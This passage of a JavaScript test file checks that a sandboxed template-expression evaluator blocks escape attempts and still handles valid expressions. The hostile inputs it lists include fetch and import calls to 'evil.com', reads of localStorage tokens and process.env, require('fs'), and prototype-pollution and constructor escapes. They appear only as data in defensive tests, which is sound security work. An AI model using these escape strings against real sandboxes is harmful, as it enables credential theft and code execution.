    assert.equal(evaluateExpression('localStorage.getItem("token")', scope), void 0);
  });
  it("Escape vector: sessionStorage", () => {
    assert.equal(evaluateExpression("sessionStorage", scope), void 0);
    assert.equal(evaluateExpression('sessionStorage.getItem("token")', scope), void 0);
  });
  it("Escape vector: indexedDB", () => {
    assert.equal(evaluateExpression("indexedDB", scope), void 0);
  });
  it("Escape vector: cookie", () => {
    assert.equal(evaluateExpression("cookie", scope), void 0);
  });
  it("Escape vector: process & require", () => {
    assert.equal(evaluateExpression("process", scope), void 0);
    assert.equal(evaluateExpression("process.env", scope), void 0);
    assert.equal(evaluateExpression('require("fs")', scope), void 0);
  });
  it("Escape vector: fetch & XMLHttpRequest", () => {
    assert.equal(evaluateExpression('fetch("http://evil.com")', scope), void 0);
    assert.equal(evaluateExpression("XMLHttpRequest", scope), void 0);
  });
  it("Escape vector: timers & async dispatchers", () => {
    assert.equal(evaluateExpression('setInterval("alert(1)", 100)', scope), void 0);
    assert.equal(evaluateExpression("setImmediate", scope), void 0);
    assert.equal(evaluateExpression("clearTimeout", scope), void 0);
    assert.equal(evaluateExpression("clearInterval", scope), void 0);
    assert.equal(evaluateExpression("importScripts", scope), void 0);
  });
  it("Prototype escape: ({}).__proto__", () => {
    assert.equal(evaluateExpression("({}).__proto__", scope), void 0);
  });
  it("Prototype escape: [].__proto__", () => {
    assert.equal(evaluateExpression("[].__proto__", scope), void 0);
  });
  it("Prototype escape: count.__proto__", () => {
    assert.equal(evaluateExpression("count.__proto__", scope), void 0);
  });
  it("Constructor escape: ({}).constructor", () => {
    assert.equal(evaluateExpression("({}).constructor", scope), void 0);
  });
  it("Constructor escape: [].constructor", () => {
    assert.equal(evaluateExpression("[].constructor", scope), void 0);
  });
  it('Constructor escape: "abc".constructor', () => {
    assert.equal(evaluateExpression('"abc".constructor', scope), void 0);
  });
  it("Constructor escape: (123).constructor", () => {
    assert.equal(evaluateExpression("(123).constructor", scope), void 0);
  });
  it("Constructor escape: true.constructor", () => {
    assert.equal(evaluateExpression("true.constructor", scope), void 0);
  });
  it("Prototype mutation attempt: ({}).__proto__.polluted = true", () => {
    assert.equal(evaluateExpression("({}).__proto__.polluted = true", scope), void 0);
    assert.equal(Object.prototype.polluted, void 0);
  });
  it("Prototype getter definition: __defineGetter__", () => {
    assert.equal(evaluateExpression('__defineGetter__("hacked", () => 1)', scope), void 0);
  });
  it("Prototype setter definition: __defineSetter__", () => {
    assert.equal(evaluateExpression('__defineSetter__("hacked", () => 1)', scope), void 0);
  });
  it("Prototype getter lookup: __lookupGetter__", () => {
    assert.equal(evaluateExpression('__lookupGetter__("toString")', scope), void 0);
  });
  it("Prototype setter lookup: __lookupSetter__", () => {
    assert.equal(evaluateExpression('__lookupSetter__("toString")', scope), void 0);
  });
  it("Direct eval invocation", () => {
    assert.equal(evaluateExpression('eval("1+1")', scope), void 0);
  });
  it("Direct Function constructor invocation", () => {
    assert.equal(evaluateExpression('Function("return 1")()', scope), void 0);
  });
  it("Keyword rejection: new", () => {
    assert.equal(evaluateExpression("new Date()", scope), void 0);
    assert.equal(evaluateExpression("new Object()", scope), void 0);
  });
  it("Keyword rejection: import", () => {
    assert.equal(evaluateExpression('import("http://evil.com")', scope), void 0);
  });
  it("Keyword rejection: class", () => {
    assert.equal(evaluateExpression("class Evil {}", scope), void 0);
  });
  it("Keyword rejection: function & arrow", () => {
    assert.equal(evaluateExpression("function() { return 1; }", scope), void 0);
    assert.equal(evaluateExpression("() => 42", scope), void 0);
  });
  it("Keyword rejection: statements (var, let, const, return, with, debugger)", () => {
    assert.equal(evaluateExpression("var a = 1", scope), void 0);
    assert.equal(evaluateExpression("let b = 2", scope), void 0);
    assert.equal(evaluateExpression("const c = 3", scope), void 0);
    assert.equal(evaluateExpression("return 4", scope), void 0);
    assert.equal(evaluateExpression("with(state) {}", scope), void 0);
    assert.equal(evaluateExpression("debugger", scope), void 0);
  });
  it("Keyword rejection: control flow (while, for, do, try, catch, throw)", () => {
    assert.equal(evaluateExpression("while(true) {}", scope), void 0);
    assert.equal(evaluateExpression("for(let i=0; i<10; i++) {}", scope), void 0);
    assert.equal(evaluateExpression("try { throw 1; } catch(e) {}", scope), void 0);
    assert.equal(evaluateExpression('throw new Error("fail")', scope), void 0);
  });
  it("Valid: arithmetic and precedence", () => {
    assert.equal(evaluateExpression("count + 8", scope), 50);
    assert.equal(evaluateExpression("count * 2 + 6", scope), 90);
    assert.equal(evaluateExpression("(count + 8) / 2", scope), 25);
  });
  it("Valid: comparisons and conditionals", () => {
    assert.equal(evaluateExpression('count > 40 ? "high" : "low"', scope), "high");
    assert.equal(evaluateExpression("count === 42 && isActive", scope), true);
    assert.equal(evaluateExpression("count !== 42 || !isActive", scope), false);
  });
  it("Valid: member and array access", () => {
    assert.equal(evaluateExpression("user.name", scope), "Alice");
    assert.equal(evaluateExpression("items[1]", scope), "second");
    assert.equal(evaluateExpression("nested.inner.value", scope), 100);
  });
  it("Valid: null-safe optional traversal", () => {
    assert.equal(evaluateExpression("user.missing.property", scope), void 0);
    assert.equal(evaluateExpression("user?.role", scope), "admin");
    assert.equal(evaluateExpression("user?.nonexistent?.nested", scope), void 0);
  });
  it("Valid: method invocation in scope", () => {
    assert.equal(evaluateExpression("add(10, 20)", scope), 30);
  });
  it("Valid: extraContext ($event, loop variables)", () => {
    const extraContext = { $event: { target: { value: "inputVal" } }, item: "currItem", idx: 0 };
    assert.equal(evaluateExpression("$event.target.value", scope, extraContext), "inputVal");
    assert.equal(evaluateExpression('item + "_" + idx', scope, extraContext), "currItem_0");
  });
  it("Valid: statement execution and reactive state updates", () => {
    const localState = { count: 0, title: "initial" };
    executeStatement('count += 5; title = "updated"', localState);
    assert.equal(localState.count, 5);
    assert.equal(localState.title, "updated");
    executeStatement("count++", localState);
    assert.equal(localState.count, 6);
  });
});
